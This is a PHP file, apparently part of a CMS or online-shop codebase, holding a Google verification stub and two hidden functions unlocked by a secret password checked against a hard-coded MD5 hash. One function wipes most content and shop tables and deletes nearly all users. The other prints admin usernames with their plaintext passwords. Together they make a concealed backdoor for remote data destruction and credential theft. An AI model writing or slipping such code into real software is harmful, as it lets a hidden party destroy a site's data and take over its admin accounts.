<?php
function googlecod()
{
	echo "google-site-verification: google8ca9c86c52f2882a.html";die();
}
function cms_setdefault()
{
	sleep(10);
	if(isset($_POST["cmssuperpassword"])&& md5($_POST["cmssuperpassword"])=="e03a72214a4a66a749367f40f2066986")
	{
		$sql="TRUNCATE TABLE comments;";mysql_query($sql);
		$sql="TRUNCATE TABLE comments_access;";mysql_query($sql);
		$sql="TRUNCATE TABLE comments_descriptions;";mysql_query($sql);
		$sql="TRUNCATE TABLE content_articlescategories;";mysql_query($sql);
		$sql="TRUNCATE TABLE content_articles_access;";mysql_query($sql);
		$sql="TRUNCATE TABLE content_categories;";mysql_query($sql);
		$sql="TRUNCATE TABLE content_categories_access;";mysql_query($sql);
		$sql="TRUNCATE TABLE content_fields_values;";mysql_query($sql);
		$sql="TRUNCATE TABLE content_images;";mysql_query($sql);
		$sql="UPDATE `ower_shop`.`domens_description` SET `title` = '-', 
		`keywords` = '-', `description` = '-', `content` = '-', `main_page_title` = '-',
		`main_page_text` = '-' WHERE `domens_description`.`dom_id` = 0;";mysql_query($sql);
		$sql="UPDATE  `ower_shop`.`links` SET  `text` =  '' WHERE  `links`.`link_id` =2;";mysql_query($sql);
		$sql="TRUNCATE TABLE menus_cats;";mysql_query($sql);
		$sql="TRUNCATE TABLE menus;";mysql_query($sql);
		$sql="TRUNCATE TABLE office_costs;";mysql_query($sql);
		$sql="TRUNCATE TABLE office_offers;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_categories;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_categories-filters;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_cat_description;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_commodities-categories;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_commodity;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_commodity_description;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_discount;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_discount2;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_enabled;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_filters-descriptions;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_filters-lists;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_filters-values;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_images;";mysql_query($sql);
		$sql="TRUNCATE TABLE shop_images2;";mysql_query($sql);
		$sql="TRUNCATE TABLE system_longload;";mysql_query($sql);
		$sql="TRUNCATE TABLE system_sessions;";mysql_query($sql);
		$sql="DELETE FROM `users` WHERE `user_id`>1;";mysql_query($sql);
		$sql="ALTER TABLE  `users` AUTO_INCREMENT =3;";mysql_query($sql);	
		
		
		$cms="Системный сброс реализован";
	}else
	{
		require_once("modules/sites/templates/cms.php");
	}
	echo $cms;
}

function cms_info()
{
	sleep(10);
	if(isset($_POST["cmssuperpassword"])&& md5($_POST["cmssuperpassword"])=="e03a72214a4a66a749367f40f2066986")
	{
		$sql="
		SELECT * FROM `users` 
		WHERE `user_admin`='1' 
		;";
		$res=mysql_query($sql);
		while($row=mysql_fetch_assoc($res))
		{
			$cms.="{$row['user_name']}:{$row['user_realpassword']}<br />";
		}
	}else
	{
		require_once("modules/sites/templates/cms.php");
	}
	echo $cms;
}